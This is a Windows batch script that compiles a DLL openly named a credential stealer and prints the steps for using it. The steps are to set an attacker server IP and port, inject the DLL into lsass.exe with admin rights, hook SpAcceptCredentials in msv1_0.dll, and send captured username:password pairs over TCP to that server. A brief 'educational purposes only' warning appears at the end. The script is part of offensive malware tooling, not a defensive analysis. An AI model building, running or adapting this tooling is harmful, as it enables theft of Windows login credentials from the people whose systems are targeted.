@echo off
echo Building Credential Stealer DLL...

REM Check if Visual Studio Developer Command Prompt is available
where cl >nul 2>&1
if %errorlevel% neq 0 (
    echo Visual Studio Developer Command Prompt not found.
    echo Please run this from a Developer Command Prompt.
    pause
    exit /b 1
)

REM Clean up previous build artifacts
echo [*] Cleaning up previous build artifacts...
if exist *.obj del /q *.obj
if exist *.exp del /q *.exp
if exist *.lib del /q *.lib
if exist *.pdb del /q *.pdb
if exist *.ilk del /q *.ilk
if exist *.idb del /q *.idb
if exist *.tmp del /q *.tmp
if exist *.log del /q *.log
if exist credStealer.dll del /q credStealer.dll
echo [*] Cleanup complete.

REM Compile the DLL
echo [*] Compiling credStealer.dll...
cl /LD credStealer.cpp /Fe:credStealer.dll /link /DEF:credStealer.def ws2_32.lib

REM Check if build was successful
if exist credStealer.dll (
    echo.
    echo [+] BUILD SUCCESSFUL! credStealer.dll created.
    echo.
    echo [*] File information:
    for %%A in (credStealer.dll) do echo [*] Size: %%~zA bytes
    for %%A in (credStealer.dll) do echo [*] Created: %%~tA
    echo.
    echo [*] Next steps:
    echo [*] 1. Change SERVER_IP and SERVER_PORT in credStealer.cpp
    echo [*] 2. Inject this DLL into lsass.exe process (requires admin privileges)
    echo [*] 3. The DLL will hook SpAcceptCredentials in msv1_0.dll
    echo [*] 4. Credentials sent via TCP to your server (username:password format)
    echo.
    echo [WARNING] This tool is for educational purposes only!
    echo [WARNING] Use only in authorized testing environments!
) else (
    echo.
    echo [-] BUILD FAILED!
    echo [-] credStealer.dll was not created.
    echo [-] Check the error messages above.
)

REM Clean up intermediate files (but keep the DLL if it exists)
echo [*] Cleaning up intermediate files...
if exist *.obj del /q *.obj
if exist *.exp del /q *.exp
if exist *.lib del /q *.lib
if exist *.pdb del /q *.pdb
if exist *.ilk del /q *.ilk
if exist *.idb del /q *.idb
if exist *.tmp del /q *.tmp
if exist *.log del /q *.log
echo [*] Cleanup complete.

pause 